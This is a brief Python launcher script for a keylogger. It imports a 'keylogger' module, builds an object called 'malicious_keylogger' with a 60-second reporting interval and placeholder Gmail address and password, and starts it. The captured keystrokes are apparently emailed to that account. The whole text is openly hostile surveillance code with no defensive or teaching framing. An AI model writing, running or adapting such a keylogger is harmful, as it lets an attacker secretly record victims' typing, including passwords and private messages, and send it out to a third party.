#!/usr/bin/env python

import keylogger


# Initialize / create keylogger
import keylogger


malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'your_mail_id@gmail.com', 'mail_password')

# Execute Keylogger

malicious_keylogger.start()
